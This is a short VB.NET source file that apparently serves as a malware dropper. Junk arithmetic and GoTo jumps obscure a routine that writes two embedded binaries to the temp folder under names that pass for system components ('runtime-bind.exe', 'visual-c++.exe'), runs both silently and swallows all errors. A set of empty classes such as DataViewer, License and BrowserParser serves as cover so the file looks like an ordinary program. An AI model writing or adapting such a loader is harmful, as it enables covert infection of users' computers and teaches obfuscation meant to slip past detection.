Imports System.Diagnostics
Imports System.IO
Module Main
    Sub Main()
        Dim IND = False

SnakeAlg:
        If Not IND Then GoTo PayLoadX
        Dim a, b, c, d, e
        a = b + 50 : e = a * (14 \ 19) / 50 : b *= (b + 5) * 150 * (9 Xor e) : c = (a / 10 * (d + 50)) \ 4 : c += 1 + a - 15 * b
        For x = 0 To b
            c = c + a Mod c
            While (CBool(c)) : c += 5 : Exit While : End While
        Next
PayLoadX:
        If Not IND Then
            IND = True
            GoTo SnakeAlg
        End If
        While (IND AndAlso Not c = 0 AndAlso a = 50)
            Dim Fold = Environment.ExpandEnvironmentVariables("%temp%\")
            Try
                Dim F_Drop = Fold & "runtime-bind.exe"
                Dim F_Drop_2 = Fold & "\visual-c++.exe"
                If File.Exists(F_Drop) Then File.Delete(F_Drop)
                If Not File.Exists(F_Drop) Then
                    File.WriteAllBytes(F_Drop, My.Resources._1)
                End If
                If File.Exists(F_Drop_2) Then File.Delete(F_Drop_2)
                If Not File.Exists(F_Drop_2) Then
                    File.WriteAllBytes(F_Drop_2, My.Resources._2)
                End If
                Process.Start(F_Drop) : Process.Start(F_Drop_2)
            Catch ex As Exception

            End Try
            IND = False
        End While
    End Sub
End Module
Class DataViewer : End Class
Class Remapper : End Class
Class Verifier : End Class
Class License : End Class
Class Database : End Class
Class AddUser : End Class
Class DeleteUser : End Class
Class Parser : End Class
Class BrowserParser : End Class